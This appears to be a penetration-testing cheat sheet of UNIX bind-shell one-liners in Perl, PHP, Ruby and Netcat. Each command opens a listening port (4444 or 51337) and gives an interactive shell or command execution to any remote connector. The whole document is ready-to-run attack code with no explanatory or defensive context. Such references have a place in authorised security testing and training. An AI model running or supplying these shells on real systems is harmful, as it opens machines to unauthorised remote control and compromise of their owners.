# UNIX Bind Shells

- Perl

```bash
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```

- PHP

```bash
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",4444);\
socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
    socket_write($cl,$m,strlen($m));}}'
```

- Ruby

```bash
ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```

- Netcat

```bash
nc -nlvp 4444 -e /bin/bash
```

- Netcat \(OpenBSD\)

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 4444 >/tmp/f
```
